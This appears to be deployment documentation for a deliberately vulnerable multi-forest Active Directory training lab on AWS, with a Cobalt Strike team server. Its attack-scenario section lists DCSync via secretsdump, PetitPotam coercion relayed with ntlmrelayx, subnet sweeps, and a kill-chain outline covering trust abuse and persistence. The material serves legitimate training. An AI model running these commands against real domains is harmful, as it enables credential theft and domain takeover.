# GOAD Full - Complete Multi-Forest AD Environment

## Overview

GOAD Full is the **complete Game of Active Directory** lab: **five Windows VMs spanning two forests and three domains**, with inter-forest and parent-child trusts. It is the most comprehensive AD training environment in the framework, modelling an enterprise estate large enough to practice cross-forest attacks, trust abuse, and full kill-chains end to end. This is the upstream GOAD reference lab (`lab_type = "GOAD"`).

Like the other GOAD labs ([Mini](./goad-mini.md), [Light](./goad-light.md)), it ships with a dedicated Cobalt Strike **Team Server**, a Windows **Attack Box**, and a **jumpbox** that serves as the GOAD Ansible provisioning host. The AWS-hosted **Dashboard Server** is the operator entry point and sole SSH/RDP jump.

> ![GOAD Full Architecture](../../generated-diagrams/goad-full-architecture.png)

## Architecture Components

### Infrastructure

| Component | IP Address | Instance Type | OS | Domain / Role | Purpose |
|-----------|-----------|---------------|-----|---------------|---------|
| **Jumpbox** | 192.168.56.100 | t2.small | Ubuntu 22.04 | — | GOAD Ansible provisioning host + legacy SSH gateway (Elastic IP) |
| **DC01 (kingslanding)** | 192.168.56.10 | t2.medium | Win Server 2019 | sevenkingdoms.local (Forest 1 root DC) | Root domain controller |
| **DC02 (winterfell)** | 192.168.56.11 | t2.medium | Win Server 2019 | north.sevenkingdoms.local (child DC) | Child domain controller |
| **DC03 (meereen)** | 192.168.56.12 | t2.medium | Win Server 2016 | essos.local (Forest 2 root DC) | Second-forest domain controller |
| **SRV02 (castelblack)** | 192.168.56.22 | t2.medium | Win Server 2019 | north.sevenkingdoms.local (member) | Member server (File/IIS/SQL) |
| **SRV03 (braavos)** | 192.168.56.23 | t2.medium | Win Server 2016 | essos.local (member) | Member server (File/IIS/SQL) |
| **Team Server** | 192.168.56.40 | t2.medium | Ubuntu 22.04 | — | Cobalt Strike team server (port 50050) |
| **Attack Box** | 192.168.56.50 | t2.large | Win Server 2022 | — | CS Client GUI + red team tools |

> **Two Windows Server versions on purpose:** the essos.local forest (DC03 meereen, SRV03 braavos) runs **Windows Server 2016** while the sevenkingdoms forest runs **Windows Server 2019**, matching the upstream GOAD reference and giving you a mixed-OS estate to attack.

### Forest & Domain Structure

```
Forest 1: sevenkingdoms.local (Root)              Forest 2: essos.local (Root)
├── DC01 kingslanding  (sevenkingdoms.local)       └── DC03 meereen (essos.local)
└── DC02 winterfell    (north.sevenkingdoms.local)     └── SRV03 braavos (member)
    └── SRV02 castelblack (member)

Trusts:
  sevenkingdoms.local  ⇄  north.sevenkingdoms.local   (parent-child, transitive)
  sevenkingdoms.local  ⇄  essos.local                 (inter-forest trust)
```

- **Forest 1 — sevenkingdoms.local:** a two-domain forest. DC01 (kingslanding) is the forest root; DC02 (winterfell) hosts the child domain `north.sevenkingdoms.local`, with SRV02 (castelblack) as a member server.
- **Forest 2 — essos.local:** a separate forest rooted on DC03 (meereen), with SRV03 (braavos) as a member server.
- **Trusts:** a transitive parent-child trust inside Forest 1, plus an inter-forest trust between sevenkingdoms.local and essos.local — the centrepiece for cross-forest attack practice.

That gives **3 domains across 2 forests**, all configured automatically during Ansible provisioning.

### Network Architecture

```
GOAD VPC: 192.168.56.0/24  (region eu-central-1)
├── Public Subnet: 192.168.56.64/26
│   ├── Jumpbox (.100) — Ubuntu, Elastic IP, Ansible provisioning + legacy SSH gateway
│   ├── Internet Gateway — bidirectional internet for public subnet
│   └── NAT Gateway — outbound-only internet for private subnet
│
└── Private Subnet: 192.168.56.0/26  — NO public IPs
    ├── DC01 kingslanding (.10) — Win2019, sevenkingdoms.local (root)
    ├── DC02 winterfell   (.11) — Win2019, north.sevenkingdoms.local (child)
    ├── DC03 meereen      (.12) — Win2016, essos.local (root)
    ├── SRV02 castelblack (.22) — Win2019, north.sevenkingdoms.local (member)
    ├── SRV03 braavos     (.23) — Win2016, essos.local (member)
    ├── Team Server (.40) — Ubuntu, CS port 50050
    └── Attack Box (.50) — Win Server 2022, CS Client + offensive tools
```

**Two subnets, not one:** the jumpbox sits in the **public subnet** with an Elastic IP; all five AD VMs, the Team Server, and the Attack Box sit in the **private subnet** with no public IPs. The primary operator entry point is the AWS-hosted **Dashboard Server**, which peers with this GOAD VPC and reaches every instance directly. The jumpbox is the GOAD **Ansible provisioning host** (and a legacy SSH fallback) — not a primary access path.

#### NAT Gateway

The NAT Gateway is **physically deployed in the public subnet** (it needs an Elastic IP and IGW access) but **serves the private subnet**:

1. The private route table points `0.0.0.0/0 → NAT Gateway`
2. When a private instance (e.g., DC01) needs internet (Windows updates, tool downloads), traffic flows `DC01 → VPC Router → NAT GW (public subnet) → IGW → Internet`
3. **Inbound connections from the internet cannot reach private instances** — NAT is outbound-only

A **free S3 Gateway VPC endpoint** is attached to both route tables so instances reach S3 (CS download, SSH key exchange) over the AWS private network, preserving VPC context for IAM confused-deputy protection.

#### Traffic Flows

| Flow | Path | Purpose |
|------|------|---------|
| Operator → Dashboard Server | SSH key + IP allow-list → Dashboard EIP | Primary entry point (jump host) |
| Dashboard → all GOAD instances | VPC peering (direct routes) | Lab access, CS tunnel, RDP/WinRM |
| Jumpbox → AD VMs | Internal VPC routing (direct) | Ansible provisioning of the AD estate |
| Operator → Jumpbox (fallback) | SSH → IGW → Jumpbox (public IP) | Legacy management access |
| AD VMs → Internet | Private subnet → NAT GW → IGW | Windows updates, downloads |
| Team Server ↔ Attack Box | Internal VPC routing (CS 50050) | CS client to server |

### Security Group

GOAD uses a **single shared security group** (`goad_sg`) for all instances:

```yaml
Inbound Rules:
  - All traffic: From within VPC CIDR (192.168.56.0/24)
  - All traffic: From peer VPC CIDR (Dashboard VPC; and C2 VPC in combined mode)
  - SSH (22): From management_cidr_blocks
  - RDP (3389): From management_cidr_blocks
  - WinRM (5985/5986): From management_cidr_blocks
Outbound Rules:
  - HTTP/HTTPS (80/443): To anywhere (updates)
  - DNS (53): To anywhere
  - ICMP: To anywhere
  - All traffic: Within VPC CIDR
```

> **Note:** the shared security group is intentional — GOAD labs are deliberately vulnerable training environments where internal traffic should flow freely. Isolation comes from the private subnet and the management IP allow-list, not from per-host SGs.

## Key Features

### 1. Multi-Forest Environment
- **Two forests** — sevenkingdoms.local and essos.local
- **Three domains** — sevenkingdoms.local, north.sevenkingdoms.local (child), essos.local
- **Inter-forest + parent-child trusts** configured automatically
- **Mixed OS** — Windows Server 2016 (essos) and 2019 (sevenkingdoms)

### 2. Dedicated C2 + Attack Box
- **Team Server** (192.168.56.40) — dedicated Ubuntu instance running CS on port 50050
- **Attack Box** (192.168.56.50) — Windows Server 2022 with CS Client GUI, PowerSploit, VS Code, WSL2, and red team tools
- **Access:** operator tunnels through the **Dashboard Server** to reach both (jumpbox is a legacy fallback)

### 3. Member Servers (SRV02, SRV03)
- **File shares** for privilege-escalation practice
- **IIS web servers** for web-based attacks
- **SQL Server** for database attacks (mssql links across the estate)
- **Print/coercion targets** for PrinterBug / PetitPotam / DFSCoerce

### 4. Advanced Attack Vectors

The full lab covers the entire GOAD attack surface, including those exclusive to a multi-forest estate:

- **Cross-forest trust abuse** — forge inter-realm TGTs, abuse SID history, traverse the sevenkingdoms ⇄ essos trust
- **Cross-domain attacks** — child-to-parent escalation within Forest 1, cross-domain Kerberoasting
- **Coercion** — PrinterBug (MS-RPRN), PetitPotam (MS-EFSRPC), DFSCoerce
- **Delegation** — unconstrained, constrained, and resource-based constrained delegation (RBCD)
- **Classic AD** — Kerberoasting, AS-REP roasting, DCSync, Golden/Silver/Diamond tickets, mssql trusted links

## Deployment

### Configuration

```hcl
# terraform.tfvars
deployment_type = "goad-full"   # Maps to GOAD lab_type "GOAD"
```

### Via Web Application

1. Navigate to **Configuration**
2. Select **GOAD Lab Type**: "GOAD Full"
3. Review the estimated cost (~$200-250/month)
4. Click **Deploy**

### Via Command Line

```bash
cd terraform
terraform init -var-file=../configs/terraform.tfvars
terraform apply -var="deployment_type=goad-full"
```

### Provisioning (two stages)

GOAD Full is the longest GOAD deployment because the AD estate is the largest:

1. **Infrastructure (~15 min)** — Terraform creates the VPC, jumpbox (with Elastic IP), the five Windows VMs, the Team Server, and the Attack Box.
2. **Ansible provisioning (~60-90 min)** — the **jumpbox** runs the GOAD playbooks against all five DCs/servers: domain promotion, trust configuration, vulnerable-object seeding. Trigger and monitor this from the dashboard's GOAD provisioning view, or run it from the jumpbox directly.

See the [GOAD Quick Start](../GOAD_QUICK_START.md) for the provisioning command sequence.

## Access Methods

The **Dashboard Server** (AWS-hosted, own VPC peered with this lab) is the operator entry point and jump host. All tunnels below run THROUGH the dashboard's EIP, which reaches every lab instance directly over VPC peering. The jumpbox remains the Ansible provisioning host (and a legacy SSH fallback).

### 1. Dashboard Web UI (Recommended)
```bash
ssh -L 5000:localhost:5000 ubuntu@<dashboard-eip>
# Open http://localhost:5000 — in-browser terminal, topology, CS beacons, Ansible provisioning
```

### 2. Cobalt Strike Client Connection
```bash
# SSH tunnel to Team Server through the Dashboard Server (from operator laptop)
ssh -L 50050:192.168.56.40:50050 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
# Then connect CS Client to localhost:50050  (password from deployment output)
```

### 3. RDP to Attack Box (via Dashboard tunnel)
```bash
ssh -L 13389:192.168.56.50:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
# Then RDP to localhost:13389  (User: Administrator, password from deployment output)
```

### 4. RDP to Domain Controllers (via Dashboard tunnel)
```bash
# DC01 kingslanding (sevenkingdoms.local)
ssh -L 3391:192.168.56.10:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
xfreerdp /v:localhost:3391 /u:Administrator /d:sevenkingdoms /p:'password'

# DC02 winterfell (north.sevenkingdoms.local)
ssh -L 3392:192.168.56.11:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
xfreerdp /v:localhost:3392 /u:Administrator /d:north /p:'password'

# DC03 meereen (essos.local)
ssh -L 3393:192.168.56.12:3389 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
xfreerdp /v:localhost:3393 /u:Administrator /d:essos /p:'password'
```

### 5. SOCKS Proxy for Tools
```bash
ssh -D 1080 -i ~/.ssh/key.pem ubuntu@<dashboard-eip>
proxychains crackmapexec smb 192.168.56.0/26   # sweep the whole private subnet
```

> **Legacy fallback (jumpbox):** if the Dashboard Server is unavailable, the jumpbox EIP still works as the SSH gateway — swap `<dashboard-eip>` for `<jumpbox-eip>` in any tunnel above, or `ssh -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>` for a direct shell.

## Attack Scenarios

### Scenario 1: Map both forests with BloodHound
```bash
bloodhound-python -d sevenkingdoms.local       -u user -p password -ns 192.168.56.10 -c all
bloodhound-python -d north.sevenkingdoms.local -u user -p password -ns 192.168.56.11 -c all
bloodhound-python -d essos.local               -u user -p password -ns 192.168.56.12 -c all
# BloodHound shows the parent-child trust AND the sevenkingdoms ⇄ essos inter-forest trust
```

### Scenario 2: Child-to-parent escalation (Forest 1)
```bash
# Compromise north.sevenkingdoms.local, then DCSync its krbtgt
secretsdump.py north.sevenkingdoms.local/administrator@192.168.56.11 -just-dc
# Forge a Golden Ticket with the parent SID to access the forest root (DC01)
```

### Scenario 3: Cross-forest trust abuse (sevenkingdoms → essos)
```bash
# Enumerate the inter-forest trust
nltest /server:192.168.56.10 /trusted_domains
# Extract the trust key, forge an inter-realm TGT, and pivot into essos.local (DC03 meereen)
```

### Scenario 4: Coercion → relay to a DC
```bash
python3 PetitPotam.py -d essos.local -u user -p password <attacker-ip> 192.168.56.12
ntlmrelayx.py -t ldap://192.168.56.12 --delegate-access
```

### Scenario 5: Full CS kill-chain across the estate
1. Land an initial beacon on SRV02 (castelblack) via a generated payload
2. Lateral-move into DC02 (winterfell), DCSync the child domain
3. Escalate to the forest root (DC01) using the parent SID
4. Traverse the inter-forest trust into essos.local (DC03 meereen)
5. Establish long-haul persistence on SRV03 (braavos)

## Cost Breakdown

### Monthly Cost Estimate: ~$200-250 (≈$350 24/7 with all hosts running)

| Resource | Type | Quantity | Monthly Cost |
|----------|------|----------|--------------|
| Jumpbox | t2.small | 1 | ~$17 |
| Domain Controllers (DC01/DC02/DC03) | t2.medium | 3 | ~$99 |
| Member Servers (SRV02/SRV03) | t2.medium | 2 | ~$66 |
| Team Server | t2.medium | 1 | ~$33 |
| Attack Box | t2.large | 1 | ~$67 |
| EBS Storage | ~40GB (AB) + 20-30GB x7 | 8 | ~$25 |
| NAT Gateway | Always on | 1 | ~$32 |
| Data Transfer | Minimal | - | ~$10-15 |
| S3 / CloudWatch | Storage/Logs | - | ~$5 |

> The README cost matrix lists GOAD Full at ~$200-250/month assuming a stop/start workflow; running all eight instances 24/7 lands closer to ~$350/month. **Stop instances when idle** to cut ~70%.

### Cost Optimization

```bash
# Stop the whole estate when not in use (saves ~70%)
aws ec2 stop-instances --instance-ids <jumpbox> <dc01> <dc02> <dc03> <srv02> <srv03> <teamserver> <attackbox>
# Storage-only cost while stopped: ~$50-70/month

# Or destroy completely when finished
terraform destroy
```

## Dashboard Server (Production Control Plane)

The dashboard runs on a dedicated AWS EC2 instance in its own VPC. It is the **production control plane and SSH jump host** — the operator entry point that all deployments (including this lab) branch from. It reaches every GOAD instance directly over VPC peering, so no SSH-hopping through the jumpbox is needed; the jumpbox is the Ansible provisioning host (and a legacy SSH fallback). The operator's laptop only runs a *dev* instance of the dashboard.

### Dashboard Infrastructure

| Component | Type | VPC / Subnet | Private IP | Public IP | Purpose |
|-----------|------|-------------|-----------|-----------|---------|
| **Dashboard Server** | t3.medium (Ubuntu 22.04) | Dashboard VPC (10.100.0.0/16) / 10.100.1.0/24 | 10.100.1.10 | EIP (Elastic IP) | Web UI, SSH jump to all GOAD instances |

### Network Connectivity

- **VPC Peering:** Dashboard VPC (10.100.0.0/16) <-> GOAD VPC (192.168.56.0/24)
- Route tables on both sides carry the peering routes so traffic flows without NAT or tunnels

### Dashboard Access to GOAD Instances

| Target | Ports | Purpose |
|--------|-------|---------|
| Jumpbox (192.168.56.100) | SSH/22 | Ansible provisioning, lab management |
| Team Server (192.168.56.40) | SSH/22, CS/50050 | Shell, CS client tunnel |
| Attack Box (192.168.56.50) | SSH/22 | Management shell, RDP tunnel |
| DC01 / DC02 / DC03 (.10 / .11 / .12) | RDP/3389, WinRM/5985 | Lab access via dashboard tunnel |
| SRV02 / SRV03 (.22 / .23) | RDP/3389, WinRM/5985 | Lab access via dashboard tunnel |

### Full Architecture with Dashboard

```
Operator Laptop  (dev instance of dashboard only — production runs in AWS)
   │ SSH key + IP allow-list, tunnel port 5000
   ▼
┌─────────────────────────────────────────────────┐
│  Dashboard VPC  10.100.0.0/16  (PRODUCTION)     │
│  Dashboard Server (10.100.1.10, EIP)            │
│    - Flask web UI on :5000                      │
│    - Control plane + SSH jump host              │
└──────────────────────┬──────────────────────────┘
                       │ VPC Peering (10.100.0.0/16 ↔ 192.168.56.0/24)
                       ▼
┌─────────────────────────────────────────────────┐
│  GOAD VPC  192.168.56.0/24                      │
│  Public Subnet (192.168.56.64/26)               │
│    ├── Jumpbox (.100, EIP) — Ansible, SSH GW    │
│    ├── Internet Gateway                         │
│    └── NAT Gateway (outbound for private)       │
│  Private Subnet (192.168.56.0/26)               │
│    ├── DC01 kingslanding (.10) — sevenkingdoms   │
│    ├── DC02 winterfell   (.11) — north.7k        │
│    ├── DC03 meereen      (.12) — essos.local     │
│    ├── SRV02 castelblack (.22) — north.7k        │
│    ├── SRV03 braavos     (.23) — essos.local     │
│    ├── Team Server (.40) — CS :50050            │
│    └── Attack Box (.50) — CS Client + tools     │
└─────────────────────────────────────────────────┘
```

### Dashboard vs Jumpbox

| | Dashboard Server (Primary) | Jumpbox (Provisioning / Fallback) |
|---|---|---|
| **Role** | Production control plane + SSH jump host | GOAD Ansible provisioning host; legacy SSH gateway |
| **Operator connects to** | Dashboard EIP via SSH tunnel (:5000) | Jumpbox EIP via SSH (fallback) |
| **Reaches AD VMs via** | Direct from dashboard (VPC peering) | Internal VPC routing from jumpbox shell |
| **Management UI** | Full web UI (topology, terminal, beacons) | None (CLI only) |
| **Primary entry point?** | Yes — all deployments branch from here | No — provisions the lab and serves as fallback |

## Comparison: GOAD Mini / Light / Full

| Feature | GOAD Mini | GOAD Light | GOAD Full |
|---------|-----------|------------|-----------|
| **AD VMs** | 1 DC | 2 DC + 1 SRV | 3 DC + 2 SRV |
| **Forests** | 1 | 1 | 2 |
| **Domains** | 1 | 2 (parent-child) | 3 (parent-child + 2nd forest) |
| **Trusts** | None | Parent-child | Parent-child + inter-forest |
| **Cross-forest attacks** | No | No | Yes |
| **Mixed OS (2016 + 2019)** | No | No | Yes |
| **Shared infra** | Jumpbox + Team Server + Attack Box | Same | Same |
| **Cost/Month** | ~$125-175 | ~$250-325 | ~$200-250 (stop/start) / ~$350 (24/7) |
| **Complexity** | Beginner | Intermediate | Advanced |

## Best Practices

### Lab Management
- ✅ **Snapshot before major operations** — the estate is large; rollback saves re-provisioning
- ✅ **Document attack chains** — great for reporting practice
- ✅ **Practice cleanup** — remove artifacts after exploitation
- ✅ **Stop when idle** — eight instances running 24/7 is the costliest GOAD lab

### Security
- ✅ **Always restrict `management_cidr_blocks`** to your IP
- ✅ **Never expose the lab to the public internet** without IP restrictions
- ✅ **Rotate the teamserver password**, especially if shared between operators
- ✅ **Use the lab responsibly** — it is deliberately vulnerable, for learning only

## Related Documentation

- [GOAD Quick Start](../GOAD_QUICK_START.md) — provisioning + connection guide
- [GOAD Mini Architecture](./goad-mini.md) — single-DC starter lab
- [GOAD Light Architecture](./goad-light.md) — multi-domain intermediate lab
- [Combined Full (C2 + GOAD Full)](./combined-full.md) — pair this lab with phase-based C2
- [Windows Attack Box](./attackbox.md) — attack box internals
- [Diagrams Index](./DIAGRAMS_INDEX.md) — all architecture diagrams

## References

- [GOAD GitHub Repository](https://github.com/Orange-Cyberdefense/GOAD)
- [GOAD Documentation](https://orange-cyberdefense.github.io/GOAD/)
- [Cross-Domain / Cross-Forest Attacks](https://adsecurity.org/?p=1588)
- [Cobalt Strike Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)

## Summary

GOAD Full is the **complete enterprise AD simulation** — five VMs, two forests, three domains, and the trusts between them.

- ✅ Multi-forest estate (sevenkingdoms.local + essos.local) with inter-forest and parent-child trusts
- ✅ Mixed Windows Server 2016/2019 for realistic heterogeneity
- ✅ Dedicated CS Team Server + Attack Box + Ansible-provisioning jumpbox
- ✅ Private-subnet isolation; Dashboard Server is the sole jump host
- ✅ Covers the entire GOAD attack surface, including cross-forest abuse

**Cost**: ~$200-250/month with stop/start (~$350 running 24/7). The destination lab for advanced AD practitioners.
